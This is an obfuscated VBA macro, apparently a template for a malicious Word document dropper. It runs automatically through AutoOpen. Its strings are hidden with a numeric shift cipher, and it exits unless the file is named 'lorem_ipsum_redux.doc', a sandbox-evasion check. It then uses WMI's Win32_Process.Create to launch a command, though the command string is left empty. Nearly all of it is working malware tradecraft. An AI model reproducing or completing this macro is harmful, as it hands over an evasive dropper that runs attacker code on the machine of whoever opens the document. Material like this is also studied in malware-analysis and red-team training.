Function Pride(Amuse)
    Pride = Chr(Amuse - 16)
End Function

Function Glove(Panel)
    Glove = Left(Panel, 3)
End Function

Function Reign(Dozen)
    Reign = Right(Dozen, Len(Dozen) - 3)
End Function

Function Truth(Anger)
    Do
    Wreck = Wreck + Pride(Glove(Anger))
    Anger = Reign(Anger)
    Loop While Len(Anger) > 0
    Truth = Wreck
End Function

Function MyMacro()
    Dim Burst As String
    Dim Brake As String
    If ActiveDocument.Name <> Truth("124127130117125111121128131133125111130117116133136062116127115") Then
        Exit Function
    End If
    
    Burst = ""
    Brake = Truth(Burst)
    GetObject(Truth("135121126125119125132131074")).Get(Truth("103121126067066111096130127115117131131")).Create Brake, Basis, Faint, Uncle, Yearn
End Function

Sub AutoOpen()
    MyMacro
End Sub

